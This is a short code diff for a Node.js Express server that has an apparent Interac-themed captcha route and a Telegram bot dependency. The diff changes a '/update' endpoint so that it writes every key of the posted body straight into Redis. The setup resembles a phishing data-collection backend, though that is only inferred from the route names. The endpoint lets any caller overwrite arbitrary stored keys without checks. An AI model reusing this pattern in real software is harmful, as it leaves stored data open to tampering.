@@ -14,7 +14,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const session = require('express-session');
 const crypto = require('crypto');
 const sessionStore = new Map();
-
+const redisClient = require('./redisClient');
 
 
 
@@ -175,11 +175,19 @@ app.get('/interac', verifyRecaptcha, (req, res) => {
     res.render('captcha/index')
 })
 
-// Endpoint to receive data
-app.post('/update', (req, res) => {
-    let data = req.body; // Assuming the body contains the updated data
-    console.log(data)
-    res.json({ message: 'Data updated' });
+app.post('/update', async (req, res) => {
+    let data = req.body;
+    console.log(data);
+
+    try {
+        for (const key in data) {
+            await redisClient.set(key, JSON.stringify(data[key]));
+        }
+        res.json({ message: 'Data updated' });
+    } catch (error) {
+        console.error(error);
+        res.status(500).send('Error updating data');
+    }
 });
 
 
